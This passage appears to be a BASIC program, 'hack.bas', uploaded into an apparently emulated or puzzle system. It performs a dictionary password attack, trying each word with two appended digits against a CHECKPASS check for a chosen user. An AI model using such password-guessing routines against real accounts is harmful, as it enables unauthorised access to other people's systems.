/bin/umodem hack.bas __END_HACK_BAS__
V        REM  +------------------------------------------------+
...
CDL      REM
CDLV     REM  fallback: try dictwordDD where DD is two decimal digits
CDLX     REM  build digits with CHR(XLVIII + n) since XlVIII = 48 = '0'
CDLXV    PRINT "trying dictwordDD patterns..." + CHR(X)
CDLXX    DIM d AS INTEGER
CDLXXV   DIM e AS INTEGER
CDLXXX   i = I
CDLXXXV  REM per-word outer loop
CDXC     d = I - I
CDXCV    e = I - I
D        IF d > IX THEN GOTO DLXXX
DV       REM candidate = words(i) + digit(d) + digit(e)
DX       IF CHECKPASS(username, words(i) + CHR(XLVIII + d) + CHR(XLVIII + e)) THEN GOTO CDXXX
DXV      e = e + I
DXX      IF e <= IX THEN GOTO DX
DXXV     e = I - I
DXXX     d = d + I
DXXXV    GOTO D
DL       REM (unused placeholder)
DLV      REM
DLX      REM
DLXV     REM
DLXX     REM finished the 00..99 sweep for word i
DLXXX    i = i + I
DLXXXV   IF i <= pwdcount THEN GOTO CDLXXXV
DCL      PRINT "no matches using dictwordDD for user " + username + CHR(X)
DCLV     END
__END_HACK_BAS__
